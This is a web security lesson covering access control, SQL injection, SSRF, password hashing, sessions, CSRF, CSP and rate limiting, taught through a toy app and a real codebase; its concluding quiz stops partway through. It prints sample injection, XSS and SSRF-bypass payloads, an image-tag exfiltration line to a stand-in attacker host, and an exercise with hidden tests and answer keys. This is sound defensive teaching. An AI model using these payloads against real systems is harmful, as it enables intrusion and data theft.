---
slug: security-fundamentals
title: "Security fundamentals: authentication, sessions, CSRF, headers and secrets in a real app"
description: The OWASP risk families as a working map, and the concrete controls a senior engineer expects, from Argon2id and opaque session tokens to CSRF layers, CSP, trusted client IPs and secret handling, read through this app's code.
minutes: 34
difficulty: hard
tags: [security, owasp, authentication, sessions, csrf, xss, csp, secrets, senior-craft]
---
Most breaches do not need a zero-day. They need one endpoint that returns another user's data when you change the ID in the URL. A login form that answers in 2 ms for unknown emails and 100 ms for real ones. A session table that stores tokens in plain text, so a leaked backup is a list of logged-in accounts. A rate limiter keyed on a header the attacker controls. Each is a small decision made by someone who was thinking about features.

Security at the senior level is not a separate phase. It is a habit of asking, at every boundary, "who controls this input, and what happens if they lie?" This lesson runs each OWASP risk family as a concrete exploit against a small toy app, shows the fix, and then reads the controls this repository uses (and a few it could use better) as the worked example. The case study's [authentication and security lesson](/learn/case-study-ascend/the-system/authentication-and-security) follows the same code further.

## Ten risk families, each as an exploit and a fix

The OWASP Top 10 (the 2021 edition is the one most teams cite; later editions reshuffle the list but keep the families) is best used as a map of where applications fail. The middle column is an attack on a toy notes app that stores each user's notes and offers search, comments and link previews; the payloads are minimal illustrations against that toy, not tools for anything real.

| OWASP 2021 | Exploit against the toy notes app | Fix | In Ascend |
|---|---|---|---|
| A01 Broken access control | Logged in as Ada, `GET /notes/11` returns Bob's note, because the handler looks the note up by ID alone (run below) | Make the owner part of the query; answer 404 for "not yours" | `InterviewService::get` returns `NotFound` for another user's interview; `CommentService::delete` allows the author or an admin |
| A02 Cryptographic failures | A leaked backup holds unsalted SHA-256 password hashes, and one GPU tests billions of guesses a second | A slow, salted, memory-hard hash; TLS everywhere; hashed session tokens | Argon2id; sessions stored as SHA-256 of the token; HSTS |
| A03 Injection | The search term `%' OR 1=1 --` rewrites the `WHERE` clause (run below); a comment `<img src=x onerror=alert(1)>` concatenated into HTML runs script | Parameterised queries; escaping by the renderer; a CSP | SeaORM's builder or SQL with bound `$1` values; React escapes text; no inline-script CSP |
| A04 Insecure design | A free AI endpoint called in a loop costs real money, and nothing in the design bounds it | Abuse cases designed in: quotas, budgets, cost ceilings | Per-session AI rate limit and per-user daily budgets in the database |
| A05 Security misconfiguration | The API reflects any `Origin` into `Access-Control-Allow-Origin` with credentials allowed, so any site can read a signed-in user's data | Deny by default; validate configuration at boot | No CORS layer at all, so cross-origin reads stay blocked; production refuses to boot without `Secure` cookies |
| A06 Vulnerable components | A transitive dependency with a published advisory ships for months unnoticed | Lockfiles, advisory scanning in CI, scheduled upgrades | Lockfiles, pnpm's supply-chain check on install, and since commit `8f82820` `cargo audit` and `pnpm audit --prod` in CI |
| A07 Identification and authentication | Credential stuffing replays leaked email and password pairs from thousands of addresses; timing reveals which emails exist | Per-account limits, uniform timing and messages, MFA | 10 password attempts per minute per account; a dummy hash for unknown emails; one error message |
| A08 Software and data integrity | CI runs a third-party action by a mutable tag, and the tag is repointed at code that prints the job's secrets | Pin actions and base images by digest; frozen lockfiles | Frozen lockfiles; since commit `8f82820`, actions pinned to commit SHAs, base images to digests, and a read-only CI token |
| A09 Logging and monitoring | An attacker tries 50,000 passwords over a week and nobody notices | Structured security events with alerts on them | JSON logs with request IDs; no alert on authentication failures is defined in the repository |
| A10 Server-side request forgery | A "preview this link" feature fetches `http://2130706433/`, which is 127.0.0.1 written as one number (run below) | Resolve the name, check every address, fetch from an isolated worker | The server never fetches a user-supplied URL; the AI provider's URL comes from configuration |

The A08 row describes a real 2025 incident, in which a popular GitHub Action's version tags were moved to a commit that dumped CI secrets into build logs. Ascend's `.github/workflows/ci.yml` used to reference every action by tag (`actions/checkout@v4`, `Swatinem/rust-cache@v2`), so the same move would have reached it, and a review of this lesson said so. Commit `8f82820` closed A06 and A08 together. Every action is now pinned to a full commit SHA with the version kept as a comment (`actions/checkout@11d5960a… # v4`), the Dockerfile's base images carry their digests, the workflow runs with `permissions: contents: read` so a compromised step holds a token that cannot push, and `.github/dependabot.yml` proposes grouped weekly pull requests to move the pins, because a pin nobody updates becomes the vulnerable component. The new audit steps paid off on their first run: `pnpm audit --prod` flagged a `lodash-es` with a published advisory, reached through `mermaid` and `chevrotain`, and `web/pnpm-workspace.yaml` now overrides it to `^4.18.1`, with a comment saying when to remove the override.

## Three exploits, run against the toy

A01 and A03, in 25 lines of Python against an in-memory SQLite database. The comments show what each line prints.

```python
import sqlite3

db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE notes (id INTEGER PRIMARY KEY, owner_id INTEGER NOT NULL, body TEXT NOT NULL);
INSERT INTO notes VALUES (10, 1, 'ada: shopping list'), (11, 2, 'bob: recovery codes 4417 9902');
""")

def search_vulnerable(user_id, term):               # A03: input becomes SQL text
    sql = f"SELECT id, body FROM notes WHERE owner_id = {user_id} AND body LIKE '%{term}%'"
    return db.execute(sql).fetchall()

def search(user_id, term):                          # fix: the driver sends term as data
    return db.execute("SELECT id, body FROM notes WHERE owner_id = ? AND body LIKE ?",
                      (user_id, f"%{term}%")).fetchall()

def get_note_vulnerable(user_id, note_id):          # A01: authenticated, never authorised
    return db.execute("SELECT body FROM notes WHERE id = ?", (note_id,)).fetchone()

def get_note(user_id, note_id):                     # fix: the owner is part of the key
    return db.execute("SELECT body FROM notes WHERE id = ? AND owner_id = ?",
                      (note_id, user_id)).fetchone()

print(search_vulnerable(1, "shop"))                 # [(10, 'ada: shopping list')]
print(search_vulnerable(1, "%' OR 1=1 --"))         # both rows: the WHERE clause was rewritten
print(search(1, "%' OR 1=1 --"))                    # []: the quote is only a character
print(get_note_vulnerable(1, 11))                   # Ada reads Bob's note by changing the id
print(get_note(1, 11))                              # None, which the API turns into a 404
```

Trace the injection. The f-string produces `... WHERE owner_id = 1 AND body LIKE '%%' OR 1=1 --%'`. `AND` binds tighter than `OR`, so the condition becomes `(owner_id = 1 AND …) OR 1=1`, true for every row, and `--` comments out the stray quote. With a placeholder the driver sends the statement and the value separately, so the database never parses the value as SQL. Ascend's request paths build queries with SeaORM or write SQL with bound values (`$1` to `$5` in the AI budget's atomic upsert in `crates/core/src/ai/budget.rs`); the one `format!` in that statement splices a compile-time constant, not input.

A10, against a preview feature that blocks internal hosts by string:

```python
import ipaddress, socket
from urllib.parse import urlsplit

def naive_allowed(url):                             # a string blocklist
    host = urlsplit(url).hostname or ""
    return host not in ("localhost", "127.0.0.1", "169.254.169.254") and not host.startswith(("10.", "192.168."))

def allowed(url):                                   # resolve first, then check every address
    host = urlsplit(url).hostname
    if not host:
        return False
    for *_, sockaddr in socket.getaddrinfo(host, None):
        ip = ipaddress.ip_address(sockaddr[0])
        if ip.version == 6 and ip.ipv4_mapped:      # ::ffff:a.b.c.d is an IPv4 address in disguise
            ip = ip.ipv4_mapped
        if not ip.is_global:                        # loopback, private, link-local, reserved
            return False
    return True

for url in ["http://2130706433/", "http://0x7f.1/", "http://[::ffff:169.254.169.254]/", "http://93.184.215.14/"]:
    print(url, naive_allowed(url), allowed(url))
# http://2130706433/ True False
# http://0x7f.1/ True False
# http://[::ffff:169.254.169.254]/ True False
# http://93.184.215.14/ True True
```

The resolver accepts the old numeric forms (a single 32-bit number, hex, shortened dotted quads), so a string check never sees `127.0.0.1`. Checking the resolved addresses closes that door, and two remain: DNS rebinding (the name resolves to a public address at check time and a private one at connect time, so connect to the address you checked) and redirects (check again at every hop). The durable fix is structural: fetch from a worker with no route to internal networks, behind an egress proxy, as [security in design](/learn/system-design/building-blocks/security-in-design) draws it.

## Under the hood: what a password hash costs

A stolen password table is attacked offline, at the attacker's pace, so the hash must be expensive for each guess. Measured on one core of this lesson's machine (Python 3.14's `hashlib`, and Node 24.21's OpenSSL 3.5 for Argon2id):

| Function | Parameters | Time per hash | Memory per hash | What it means for an attacker |
|---|---|---|---|---|
| SHA-256 | one pass | 0.17 µs | none | A GPU tries on the order of ten billion guesses a second |
| PBKDF2-HMAC-SHA256 | 600,000 iterations | 49 ms | none | 600,000 times fewer guesses, but GPUs parallelise it freely |
| scrypt | $N = 2^{17}$, $r = 8$, $p = 1$ | 197 ms | 128 MiB | Memory caps how many guesses run at once |
| Argon2id | 19,456 KiB, 2 passes, 1 lane (Ascend's) | 11.9 ms | 19 MiB | A GPU with 24 GiB holds about 1,290 instances at a time |

`crates/core/src/auth/password.rs` uses Argon2id with the `argon2` crate's defaults (those parameters, which match OWASP's minimum recommendation) and a random 16-byte salt per password, so identical passwords get different hashes and precomputed tables are useless. The pure-Rust crate is usually slower than OpenSSL's implementation, and the module's own comment estimates about 100 ms; budget tens of milliseconds and 19 MiB per call.

That cost lands on the server too:

```rust
static HASH_PERMITS: LazyLock<tokio::sync::Semaphore> = LazyLock::new(|| {
    let cpus = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(2);
    tokio::sync::Semaphore::new(cpus.max(2))
});

pub async fn hash(password: String) -> AppResult<String> {
    let _permit = HASH_PERMITS.acquire().await.map_err(AppError::internal)?;
    tokio::task::spawn_blocking(move || hash_sync(&password))
        .await
        .map_err(|e| AppError::Internal(format!("join: {e}")))?
}
```

On Tokio's async workers a hash would stall every request scheduled on that thread, so `spawn_blocking` moves it to the blocking pool. The first version stopped there, and a review found the gap: the blocking pool grows to 512 threads by default, so a burst of logins could run hundreds of Argon2 computations at once, and 512 × 19 MiB is about 9.5 GiB, far past the container's memory. The semaphore now admits one hash per CPU (minimum two), `verify` takes the same permit, and the authentication rate limiter bounds how many wait. The rule generalises to any CPU-heavy call in an event loop: move it off the async workers *and* bound how much runs at once ([async and event loops](/learn/systems/concurrency/async-and-event-loops)).

`RegisterInput` requires 10 to 200 characters. Length beats composition rules, which push users toward predictable patterns, and current NIST guidance favours length plus screening against breached passwords; the upper bound caps the work one request can force.

## Login without leaking who has an account

From `crates/core/src/auth/service.rs`:

```rust
let user = Users::find().filter(users::Column::Email.eq(&email)).one(&self.db).await?;
// Always verify, even for unknown users, to keep timing uniform.
let ok = password::verify(input.password, user.as_ref().map(|u| u.password_hash.clone())).await;
let Some(user) = user.filter(|_| ok) else {
    return Err(AppError::Validation("invalid email or password".into()));
};
```

For an unknown email, `password::verify` checks against a precomputed `DUMMY_HASH` and returns `ok && exists`, always false, so both branches pay one Argon2id verification and the message is identical. Without it, a stopwatch enumerates accounts: unknown addresses return in a millisecond, real ones after a full hash. "Precomputed" took a fix: `DUMMY_HASH` is lazily initialised, and the first unknown-email login after each boot used to compute it, making that one response about twice as slow. `main` now calls `password::warm_up()` before serving. A timing defence has to cover the first call too.

Registration is the other door. It used to look the email up before hashing, so "already registered" came back about 100 ms faster than a successful sign-up, and two simultaneous sign-ups could both pass the check, the loser hitting the unique index as a `500`. It now hashes first, inserts, and lets the unique index decide, mapping the violation to `409`; `concurrent_registrations_for_one_email_yield_one_account_and_conflicts` in `crates/api/tests/api.rs` fires four sign-ups at once and expects one `200` and three `409`s. The message itself still reveals a registered email, a conscious trade: the full fix is an email-verification flow ("if this address can register, we have sent it a link"), which costs email infrastructure and friction, and the mitigation here is the per-IP authentication limit.

## Sessions: opaque tokens, stored hashed

After login the server must recognise the browser. `crates/core/src/auth/token.rs` generates 32 random bytes (256 bits) as 43 URL-safe base64 characters, and the `sessions` table, created in `migration/src/m0001_identity.rs`, stores only their SHA-256 as its primary key, so an attacker holding the table holds hashes that cannot be turned back into cookies. The integration suite registers a user, takes the raw token from the cookie, and asserts that no row in `sessions` contains it.

Why SHA-256 here when passwords need Argon2id? Entropy. A password is a few dozen bits of human-chosen text, so each guess must be slow. A 256-bit random token cannot be found at any guess rate: at $10^{12}$ guesses a second, searching half of $2^{256}$ takes about $10^{57}$ years. Slow hashing is for low-entropy secrets only.

| | Opaque session (Ascend) | Self-contained JWT |
|---|---|---|
| Per-request check | Indexed primary-key lookup | Signature verification, no I/O |
| Revocation | Delete the row, effective at once | Wait for expiry, or keep a denylist (a session table again) |
| Size | A 58-byte cookie | Hundreds of bytes to kilobytes |
| Keys to manage | None | Signing keys to protect and rotate |

[Authentication and authorization](/learn/senior-craft/software-craft/authentication-and-authorization) measures those costs and builds the hybrid that JWTs need. The details around Ascend's tokens matter as much: `token::looks_valid` rejects anything that is not 43 URL-safe characters before touching the database; `authenticate` deletes expired sessions it meets and an hourly task sweeps the rest; `last_seen_at` is written at most hourly; `logout_everywhere` deletes every session for the user; and deleting the account requires the password as well as the session, charged to the same per-account attempt budget as login, answering a wrong password with `422` rather than a `401` that would make the SPA treat the learner as signed out. The cookie is `HttpOnly`, `SameSite=Lax`, scoped to `/`, and `Secure` when configured, and `crates/core/src/config.rs` refuses to boot in production unless it is.

## Authorisation: every query has an owner

The toy's `get_note_vulnerable` is broken access control in its purest form, and it passes every happy-path test. In Ascend, `InterviewService::get` in `crates/core/src/services/interviews.rs` returns `NotFound` when the interview's `user_id` is not the caller's, so another user's interview looks exactly like a missing one, and `CommentService::delete` allows the author or an admin and returns `Forbidden` otherwise. Both checks live in the core services, not in route handlers, so a future CLI or worker inherits them.

Two review notes. The comment route used to compute `user.role == "admin"` itself; it now calls `CurrentUser::is_admin`, so the meaning of "admin" is defined in core, though the service still receives a bare boolean and core has two `is_admin` methods with the same body; passing the principal would leave one definition. And "fetch, then compare" depends on every author remembering the comparison; filtering in the query (`WHERE id = $1 AND user_id = $2`), as the toy's fix does, makes the safe path the only path.

## CSRF: the problem with ambient credentials

Browsers attach cookies to requests triggered by *other* sites. If `evil.example` serves an auto-submitting form that POSTs to your API, the victim's browser sends their session cookie with it, and the server sees a valid session and a plausible request. `crates/api/src/middleware/csrf.rs` layers three independent defences:

1. **`SameSite=Lax` cookies.** Browsers withhold the cookie from cross-site POST, PUT and DELETE sub-requests. Lax still sends it on top-level GET navigations, which is why GET handlers must never change state.
2. **Origin check.** On every mutating method, `Origin` (or, if absent, the origin part of `Referer`) must equal the configured `PUBLIC_ORIGIN` exactly: scheme, host and port. Requests with neither header come from non-browser clients, which carry no ambient cookies.
3. **A required custom header.** Every POST, PUT, PATCH and DELETE must carry `X-Requested-With`. A cross-origin page cannot set a custom header without a CORS preflight, which this server never grants; `web/src/lib/api.ts` adds it to every request.

Four forged requests traced through the layers, with `PUBLIC_ORIGIN` set to `https://ascend.example`:

| Forged request | Cookie attached? | Origin check | Custom header | Outcome |
|---|---|---|---|---|
| Auto-submitting `<form method="post">` on `evil.example` | No: a cross-site POST under Lax | `https://evil.example` is not the origin: reject | Absent, since forms cannot set headers: reject | `403 csrf`, three times over |
| `fetch` with `method: "DELETE"`, `credentials: "include"` and an `X-Requested-With` header, from `evil.example` | Would be withheld | Not reached | The custom header forces a CORS preflight, which is never granted | The browser never sends the DELETE |
| A form on a compromised `blog.ascend.example` | Yes: same site | `https://blog.ascend.example` is not the origin: reject | Absent: reject | `403 csrf`, with `SameSite` already beaten |
| `curl` with a stolen cookie and the header | Yes, set by the attacker | Neither header present: allowed | Present | Allowed: this is session theft, which no CSRF defence addresses |

`SameSite` is a browser policy with a history of partial support, and "same-site" is not "same-origin": a compromised sibling subdomain is the same site. The custom-header rule depends on the server never enabling permissive CORS. Stacked, each covers the others' gaps, and that paid off once. The first Referer check compared by prefix (`referer.starts_with(expected)`), which a Referer of `https://ascend.example.evil.net/page` satisfies, and the local-development allowance matched `http://localhost.evil.net` the same way. The custom header still blocked forged requests. The middleware now delegates to `allowed(headers, public_origin)`, which reduces a Referer to its origin, compares origins for equality, parses the host of a local-development origin before comparing it, and has unit tests for each look-alike. Compare security identifiers by parsing and equality, never by prefix, and pull the decision out of the framework so every tricky input is testable in microseconds.

```exercise
id: csrf-gate
title: Implement the CSRF gate
prompt: |
  Implement `csrf_allowed(method, headers, expected_origin)`. Header names in
  `headers` are lowercase. Rules:

  1. GET, HEAD and OPTIONS are always allowed (they must not change state).
  2. POST, PUT, PATCH and DELETE require an `x-requested-with` header;
     without it, reject.
  3. If an `origin` header is present, it must equal the expected origin,
     ignoring trailing slashes on either side.
  4. Otherwise, if a `referer` header is present, it must either equal the
     expected origin or start with the expected origin followed by `/`
     (a plain prefix match would accept `https://app.example.evil.net`).
  5. If neither header is present, allow (non-browser client).

  Return `true` to allow, `false` to reject.
languages: [python, javascript]
entry: csrf_allowed
starter:
  python: |
    def csrf_allowed(method, headers, expected_origin):
        # your code here
        return True
  javascript: |
    function csrf_allowed(method, headers, expected_origin) {
      // your code here
      return true;
    }
tests:
  - args: ["GET", {}, "https://ascend.example"]
    expected: true
    label: safe methods pass
  - args: ["POST", {"origin": "https://ascend.example", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: true
  - args: ["POST", {"origin": "https://evil.example", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: false
    label: foreign origin
  - args: ["PUT", {"origin": "https://ascend.example"}, "https://ascend.example"]
    expected: false
    label: missing custom header
  - args: ["DELETE", {"x-requested-with": "fetch"}, "https://ascend.example"]
    expected: true
    label: non-browser client
  - args: ["POST", {"referer": "https://ascend.example.evil.net/page", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: false
    hidden: true
    label: a prefix is not an origin
  - args: ["PATCH", {"referer": "https://ascend.example/learn/x", "x-requested-with": "fetch"}, "https://ascend.example/"]
    expected: true
    hidden: true
    label: trailing slash in configuration
hints:
  - "Normalise both origins by stripping trailing slashes before comparing."
  - "Check the custom header before looking at Origin or Referer; it is required for every mutating method."
```

## XSS and the Content Security Policy

Cross-site scripting is injection into HTML: the toy's comment `<img src=x onerror=alert(1)>`, concatenated into a page, runs script with the victim's session. The first defence is the renderer: React escapes text, and its one raw-HTML API is named `dangerouslySetInnerHTML`. Ascend used it once, for exercise prompts, behind a hand-rolled escaper that every reviewer had to re-verify; prompts now go through the same `react-markdown` component as lessons, with no raw-HTML plugin, and the codebase has no `dangerouslySetInnerHTML` at all. The one direct HTML write left is in `web/src/components/Mermaid.tsx`, which sets `innerHTML` to the SVG Mermaid renders; because it also renders diagrams in coach replies, which are model output, it initialises Mermaid with `securityLevel: "strict"`.

The second defence tells the browser what the page may load and run even if an injection slips through. `crates/api/src/middleware/security_headers.rs` sets, among others:

```text
default-src 'self';
script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval' https://cdn.jsdelivr.net blob:;
img-src 'self' data: blob:;
connect-src 'self' https://cdn.jsdelivr.net https://pypi.org https://files.pythonhosted.org;
frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
```

No `'unsafe-inline'` for scripts is what blocks injected `<script>` tags and `onerror=` handlers. `'unsafe-eval'` is a documented weakening: the in-browser runners (Pyodide and the JavaScript sandbox) need `new Function` and WebAssembly. It is compensated elsewhere: learner code runs in Web Workers with no DOM, `web/src/runner/js.worker.ts` removes `fetch`, `XMLHttpRequest`, `WebSocket`, `importScripts`, `indexedDB` and `caches` from the worker's scope, and `web/src/runner/index.ts` terminates any worker past its time limit. A review also tightened `img-src`, which used to allow any HTTPS host: an injected `<img src="https://attacker.example/?d=...">` carries data off a page with no script at all. Every source in a CSP should be there because a feature needs it.

The same design draws a trust boundary on purpose. Learner code runs in the browser, so test results arrive as claims; `docs/adr/0003-client-side-code-execution.md` accepts that for practice ("a learner who fakes a result only cheats themselves") and says competitive features would need server-side verification. The remaining headers close one door each: `frame-ancestors 'none'` and `X-Frame-Options: DENY` stop clickjacking, `nosniff` stops content-type confusion, and `Strict-Transport-Security` with a one-year `max-age` makes browsers refuse plain HTTP.

## Transport: TLS everywhere

The platform terminates TLS at its edge, and the app enforces the consequences: `COOKIE_SECURE` defaults to true whenever `PUBLIC_ORIGIN` starts with `https://`, and production refuses to boot without it. [TLS and PKI](/learn/networking/fundamentals/tls-and-pki) covers certificates and chains.

```viz
{"type": "network", "scenario": "https-tls-handshake", "title": "TLS 1.3 protects the cookie in transit", "caption": "One round trip establishes keys; everything after, including the Cookie header, is encrypted. HSTS ensures the browser never tries plain HTTP first."}
```

## Rate limits and the client IP you can trust

`crates/api/src/middleware/rate_limit.rs` keeps four keyed limiters (the `governor` crate implements GCRA, equivalent to a token bucket), and the interesting decision in each is the key:

| Limiter | Limit | Keyed by | Stops |
|---|---|---|---|
| `auth` (register, login) | 30 per minute | client IP | one address hammering the Argon2 endpoints |
| `password_attempts` (login, account deletion) | 10 per minute | the account's email, trimmed and lowercased | guessing one learner's password from any number of addresses |
| `general` (all of `/api`) | 1,200 per minute | client IP | one client flooding cheap reads |
| `ai` (routes that call the model) | 20 per minute | session (IP if there is none) | one learner burning model calls |

Most of that table is one review finding: a class or an office shares one NAT address, and per-IP limits punish it. The login bucket used to be 10 per minute per IP, both too tight for a class signing in together and too weak against guesses spread across addresses; the per-account limiter is the real defence, and its comment says so. The AI bucket used to be per IP and wrapped every coach route, so thirty learners behind one address shared twenty calls a minute and reading history spent them; it now wraps only model-calling routes and keys on the first 16 bytes of the SHA-256 of the session cookie. Throttled responses carry a `Retry-After` computed from the limiter. [Rate-limiting algorithms](/learn/networking/network-algorithms/rate-limiting-algorithms) covers the distributed versions.

```viz
{"type": "system", "algorithm": "token-bucket", "title": "Keyed token buckets", "caption": "Each key (an IP, an account, a session) refills at a fixed rate up to a burst size. Password attempts get a small bucket; general browsing a large one."}
```

A limiter is only as good as its key. Behind a proxy the socket address is the proxy, and the first entry of `X-Forwarded-For` is whatever the client sent, so keying on it gives an attacker a fresh bucket per request. Ascend reads the IP only from the header named in `CLIENT_IP_HEADER`, one the trusted edge sets itself (`x-real-ip` on Railway), and otherwise uses the socket address; the check you still owe is that the edge overwrites a client-supplied copy. The request ID gets the same suspicion: `crates/api/src/middleware/request_id.rs` keeps a client-supplied `x-request-id` only if it parses as a UUID. Two limits of the design are worth stating in review: the buckets live in process memory, so two instances double every budget, and anyone can spend a learner's ten attempts a minute, a small self-healing lockout that is the price of stopping distributed guessing.

## Secrets

`crates/core/src/config.rs` wraps the database URL and the AI key in `SecretString` from the `secrecy` crate: its `Debug` output is redacted and reading it needs an explicit `expose_secret()`, which stops a `tracing::debug!(?config)` from printing the database password. It does not stop a library quoting the URL back: sea-orm's connect error includes the whole connection string when it cannot parse it, so since commit `8f82820` `connect_db` passes the error through `redact_credentials`, which replaces the password with `***` before the message is logged. The rest is process. Secrets come from the platform's environment, and `.dockerignore` excludes `.env`, because anything copied into a layer is recoverable even if a later layer deletes it. `.railway/railway.ts` declares `ANTHROPIC_API_KEY: preserve()`, which keeps the value set in the platform, so the file can be public. Rotating the AI key is a variable change and a restart. Scan for committed secrets in a pre-commit hook and in CI, because the cheapest leak to fix is the one that never lands.

## Failure modes

| Symptom | Diagnosis | Fix |
|---|---|---|
| A user sees another user's record after changing an ID in the URL | The lookup is by ID alone; tests only cover the owner | Owner in the `WHERE` clause; a test that reads as a second user |
| Memory spikes and the process is OOM-killed during a login burst | Password hashing on an unbounded blocking pool: hundreds of 19 MiB hashes at once | A semaphore of one hash per CPU, plus a per-IP auth limit |
| Login latency differs by about one hash between known and unknown emails | The unknown branch skips verification, or the first dummy hash is computed on demand | Verify against a dummy hash that is computed at boot |
| The per-IP limiter never throttles a scripted attack | The key comes from a client-controlled header such as the first `X-Forwarded-For` entry | Key on a header the edge overwrites, or on the socket address; limit per account too |
| The preview service fetches cloud metadata credentials | A string blocklist; numeric or IPv6-mapped forms bypass it | Resolve, check every address, pin it for the connection, re-check redirects, isolate the fetcher |
| CI secrets appear in a build log after no change of yours | A third-party action's tag was moved to malicious code | Pin actions to commit SHAs; limit which jobs receive secrets |

## Trade-offs: the CSRF defences compared

| Defence | Stops | Defeated by | Cost | Depends on |
|---|---|---|---|---|
| `SameSite=Lax` cookie | Cross-site POSTs and sub-requests | A GET that changes state; a compromised sibling subdomain | A flag | Browser support |
| Exact `Origin` check | Any cross-origin browser request | Prefix comparisons; clients that send neither header, which carry no cookie | A header comparison | A correct `PUBLIC_ORIGIN` |
| Required custom header | Any cross-origin request without a preflight | A permissive CORS policy | One header in the client | Never granting preflights |
| Synchroniser token | Forged requests from any origin | XSS, which can read the token | Server state or signing; plumbing into every form | Token delivery to the page |

## Interviewer follow-ups

**"Sessions are hashed with SHA-256 but passwords with Argon2id. Is that inconsistent?"** Model answer: no; slow hashing compensates for low entropy. A 256-bit random token cannot be brute-forced at any rate, so a fast hash already makes a leaked table useless, while a human password falls to a fast hash in minutes. Argon2id on every authenticated request would add tens of milliseconds for nothing. Common wrong answer: "use Argon2id for tokens too, to be safe", which slows every request and changes no attack.

**"How do you stop credential stuffing without locking out whole offices?"** Model answer: limit per account (the attacker cannot vary the key), keep per-IP limits loose because NATs share addresses, add breached-password screening and MFA, and alert on distributed failure patterns. Common wrong answer: "block the IP after five failures", which punishes a school and does nothing against a botnet.

**"Our preview feature blocks 127.0.0.1 and 169.254.169.254. Is SSRF handled?"** Model answer: no: numeric and IPv6-mapped encodings, DNS names that resolve to internal addresses, rebinding between check and connect, and redirects all pass a string list. Resolve, check every address, connect to the checked address, re-check each redirect, and run the fetcher with no route inside. Common wrong answer: "add more entries to the blocklist."

**"Where do you put authorisation checks?"** Model answer: in the domain service that loads the resource, ideally in the query itself, returning 404 for private resources that are not the caller's; route handlers only authenticate. Common wrong answer: "in middleware by role", which cannot know which record a request touches.

## What mid-level engineers get wrong

- **Checking authentication and calling it authorisation.** Every logged-in user can then read every record whose ID they guess.
- **Building SQL or HTML with string formatting**, then escaping by hand in some places.
- **Fast hashes for passwords, or slow hashes for random tokens.** The first cracks in hours; the second adds latency for no gain.
- **Keying rate limits on `X-Forwarded-For`** or on IP alone for login.
- **Comparing origins, hosts or URLs by prefix** instead of parsing and comparing for equality.
- **Blocklisting URLs by string** for server-side fetches.
- **Referencing CI actions and base images by mutable tag** in a pipeline that holds deploy secrets.

## Senior signals

- You ask **"who controls this input?"** at every boundary, including headers such as `X-Forwarded-For`, `Origin` and `Referer`.
- You can run each OWASP family as a **concrete exploit and fix** on a whiteboard, and say which ones your system still has open.
- You can explain why passwords need a **slow, memory-hard, salted** hash while 256-bit session tokens need only **SHA-256**, with the numbers.
- You design login to be **timing-uniform and message-uniform**, and you know which other endpoints still enumerate accounts.
- You put **authorisation in the domain layer**, scoped by owner in the query, and treat 404-for-not-yours as the default.
- You treat every weakened control (`'unsafe-eval'`, a permissive CORS rule, an unpinned action) as a **documented trade-off with named compensating controls**.

## Check yourself

```quiz
- q: >-
    Ascend stores session tokens as SHA-256 hashes but passwords as Argon2id hashes. Why is a fast hash acceptable for the tokens?
  options: ["Tokens expire within 30 days, so a stolen hash is soon useless", "Tokens are 256 random bits, so no guess rate could ever find one", "SHA-256 is a stronger algorithm than Argon2id for short inputs", "Tokens are also encrypted at rest, so the hash is a second layer"]
  answer: 1
  explanation: >-
    Slow hashing compensates for low-entropy inputs that attackers can guess. A 256-bit random token has no guessable structure: at a trillion guesses a second, searching half the space takes around 10^57 years. Expiry limits the window but does not replace hashing, SHA-256 is faster than Argon2id rather than stronger, and the tokens are not encrypted in the database: the hash is the only protection, and it is enough.
- q: >-
    A search endpoint builds SQL with an f-string, and the term %' OR 1=1 -- returns every user's rows. Why does a parameterised query stop this?
  options: ["The driver sends the value separately, so it is never parsed as SQL", "The database rejects any value that contains an SQL keyword like OR", "Parameterised queries escape quotes by doubling them before sending", "Placeholders limit the value's length so a payload cannot fit in it"]
  answer: 0
  explanation: >-
    With a placeholder the statement's structure is fixed before the value arrives; the value is bound as data, so its quote and OR are only characters in a LIKE pattern, and the toy's fixed search returned no rows. Escaping is the fragile alternative that parameterisation replaces, and databases do not filter keywords or cap lengths for you.
- q: >-
    A rate limiter keys login attempts on the first IP in X-Forwarded-For. What can an attacker do?
  options: ["Skip the CSRF check, since the limiter runs before the CSRF layer", "Spoof only IPv6 addresses, because IPv4 entries are checked against TCP", "Send a new fake IP each request and get a fresh bucket every time", "Nothing, because proxies replace the header with the real client IP"]
  answer: 2
  explanation: >-
    Proxies append to X-Forwarded-For; they do not remove what the client sent, so the first entry is attacker-controlled whatever its address family. Each fake IP gets its own bucket, so the per-IP limit disappears. The limiter's key has nothing to do with CSRF. Key on a header your trusted edge overwrites (Ascend reads only CLIENT_IP_HEADER, x-real-ip on Railway), or on the socket address, and limit per account as well.
- q: >-
    A link-preview service rejects URLs whose host is 127.0.0.1, localhost or 169.254.169.254. Why is http://2130706433/ still dangerous?
  options: ["The resolver reads it as 127.0.0.1, which the string check never saw", "Browsers rewrite numeric hosts to the metadata address on redirect", "Any URL without a dot bypasses TLS, so the fetch happens in plain text", "Port 80 is implied, and the blocklist only covers explicit port numbers"]
  answer: 0
  explanation: >-
    2130706433 is 127.0.0.1 written as one 32-bit number, and getaddrinfo accepts it, as it accepts hex and IPv6-mapped forms. Only a check on the resolved address catches every encoding, and even then the fetcher must connect to the address it checked and re-check redirects. Ports and TLS are unrelated to the bypass.
- q: >-
    Which request does SameSite=Lax NOT stop the browser from sending the session cookie with?
  options: ["A top-level GET navigation from another site to your page", "A cross-site form POST that submits itself when the page loads", "A cross-site image tag whose src points at your API", "A cross-site fetch() call that uses the DELETE method"]
  answer: 0
  explanation: >-
    Lax sends cookies on top-level GET navigations so that links into your site keep users logged in. That is why state-changing operations must never be GETs. The auto-submitting POST and the cross-site DELETE use unsafe methods, and the image is a cross-site sub-request; Lax withholds the cookie from all three.
- q: >-
    The CSP in security_headers.rs includes 'unsafe-eval'. What makes this acceptable?
  options: ["Nothing; every 'unsafe-' keyword should be removed at once", "The policy also allows 'unsafe-inline' scripts, which cancels it out", "The runners need it, and learner code runs in time-limited workers", "It only relaxes CSS evaluation, so script execution is still locked down"]
  answer: 2
  explanation: >-
